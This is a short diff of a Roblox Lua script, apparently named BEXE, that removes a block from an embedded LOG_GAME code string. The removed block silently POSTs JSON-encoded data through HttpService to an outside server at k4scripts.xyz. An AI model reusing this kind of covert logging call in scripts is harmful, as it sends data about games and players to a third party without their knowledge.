@@ -113,19 +113,6 @@ game:GetService("Debris"):AddItem(BEXE, 3);
 local LOG_GAME = [[
 if BEXE_LOG == true then return; end;
 getfenv()["BEXE_LOG"] = true;
-
-    
-local httpService = game:GetService("HttpService");
-httpService:RequestAsync(
-    {
-        Url = "https://k4scripts.xyz/bexe/log",
-        Method = "POST",
-        Headers = {
-            ["Content-Type"] = "application/json"
-        },
-        Body = httpService:JSONEncode({Data = "%s"})
-    }
-);
 ]];
 
 --// UTILS \\--
